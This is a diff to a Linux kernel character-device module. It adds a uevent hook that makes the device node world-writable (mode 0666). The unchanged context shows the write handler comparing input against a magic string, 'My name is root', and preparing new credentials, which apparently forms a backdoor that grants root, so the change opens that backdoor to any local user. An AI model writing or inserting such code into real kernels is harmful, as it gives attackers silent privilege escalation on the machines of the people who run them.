@@ -27,6 +27,11 @@ static int     dev_release(struct inode *, struct file *);
 static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
 static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
 
+static int uevent(struct device *dev, struct kobj_uevent_env *env){
+  add_uevent_var(env, "DEVMODE=%#o", 0666);
+  return 0;
+}
+
 static struct file_operations fops = {
     .open    = dev_open,
     .read    = dev_read,
@@ -47,6 +52,8 @@ static int __init test_init(void) {
 
   // Create a class which will appear at /sys/class
   devClass = class_create(THIS_MODULE, CLASS_NAME);
+  devClass->dev_uevent = uevent;
+  
   cdevice  = device_create(devClass, NULL, dev_num, NULL, DEVICE_NAME);
 
   if (ret < 0) {
@@ -92,6 +99,7 @@ static ssize_t dev_write(struct file *filep,
                          const char __user *buf,
                          size_t             len,
                          loff_t *           offset) {
+  
   char *       data;
   char         magic[] = "My name is root";
   struct cred *new_cred;
